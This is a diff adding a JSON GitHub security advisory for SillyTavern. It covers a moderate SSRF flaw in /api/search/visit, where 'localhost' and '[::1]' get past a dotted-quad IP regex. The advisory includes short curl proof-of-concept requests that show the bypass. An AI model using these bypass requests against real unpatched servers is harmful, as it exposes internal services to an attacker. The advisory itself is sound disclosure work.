@@ -1,0 +1,50 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-04-01T21:42:25Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "sillytavern"
+  },
+  "Advisory": {
+    "DatabaseId": 346462,
+    "Id": "GSA_kwCzR0hTQS13bTdqLW02am0tODc5N84ABUle",
+    "GhsaId": "GHSA-wm7j-m6jm-8797",
+    "References": [
+      {
+        "Url": "https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-wm7j-m6jm-8797"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-wm7j-m6jm-8797"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-wm7j-m6jm-8797"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-34526"
+      }
+    ],
+    "Description": "### Details\nDistinct from CVE-2025-59159 and CVE-2026-26286 (all fixed in v1.16.0). This endpoint is still unpatched.\n\nIn `src/endpoints/search.js` line 419, the hostname is checked against `/^\\d+\\.\\d+\\.\\d+\\.\\d+$/`. This only matches literal dotted-quad IPv4 (e.g. `127.0.0.1`, `10.0.0.1`). It does not catch:\n- `localhost` (hostname, not dotted-quad)\n- `[::1]` (IPv6 loopback)\n- DNS names resolving to internal addresses (e.g. `localtest.me` -\u003e 127.0.0.1)\n\nA separate port check (`urlObj.port !== ''`) limits exploitation to services on default ports (80/443), making this lower severity than a fully unrestricted SSRF.\n\n### PoC\n1. Start SillyTavern v1.16.0 normally\n2. Send requests to compare blocked vs bypassed (requires a valid session cookie or CSRF disabled):\n```bash\n# Blocked — dotted-quad matched by regex\ncurl -s -o /dev/null -w \"%{http_code}\" -X POST http://127.0.0.1:8000/api/search/visit \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\": \"http://127.0.0.1/\", \"html\": true}'\n# Returns: 400 (blocked)\n\n# Bypassed — \"localhost\" is not dotted-quad\ncurl -s -o /dev/null -w \"%{http_code}\" -X POST http://127.0.0.1:8000/api/search/visit \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\": \"http://localhost/\", \"html\": true}'\n# Returns: 500 (passed validation, fetch attempted, ECONNREFUSED because nothing on port 80)\n\n# Bypassed — IPv6 loopback is not dotted-quad\ncurl -s -o /dev/null -w \"%{http_code}\" -X POST http://127.0.0.1:8000/api/search/visit \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\": \"http://[::1]/\", \"html\": true}'\n# Returns: 500 (passed validation, fetch attempted)\n```\n\nThe 400 vs 500 difference confirms `localhost` and `[::1]` pass the IP check. The 500 is ECONNREFUSED (nothing listening on port 80), not a validation rejection.\n\n### Impact\nServer-side request forgery with partial restrictions. An authenticated user can force the server to fetch from internal hosts on default ports (80/443) using hostnames or IPv6 addresses that bypass the IP check. The full response body is returned. Lower severity than a fully unrestricted SSRF due to the port limitation.\n\n## Resolution\n\nThe issue was addressed in version 1.17.0 by improving IPv6 address validation",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-01T21:42:24Z",
+    "Severity": "MODERATE",
+    "Summary": "SillyTavern: Incomplete IP validation in /api/search/visit allows SSRF via localhost and IPv6",
+    "UpdatedAt": "2026-04-01T21:42:25Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.17.0"
+      },
+      "VulnerableVersionRange": "\u003c= 1.16.0"
+    }
+  ]
+}
